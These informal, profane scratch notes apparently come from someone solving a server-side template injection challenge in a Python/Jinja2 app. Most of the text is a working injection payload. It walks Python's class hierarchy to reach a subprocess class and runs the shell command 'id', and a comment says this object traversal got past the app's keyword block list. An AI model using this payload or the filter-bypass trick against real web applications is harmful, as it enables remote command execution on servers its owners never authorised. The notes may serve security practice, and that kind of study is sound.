...
# I think this is how i gotta do this shit but the index is not 253

render_template_string("{{''.__class__.__mro__[1].__subclasses__()[253]('id', shell=True, stdout=-1).communicate()[0]}}")


# wholly fucking shit it finally worked -- this worked
...
wasnt the templating issue is that if you did the object traversal in python those keywords were not blocked. !!!!!!!!
...
#this a process running idk if matter
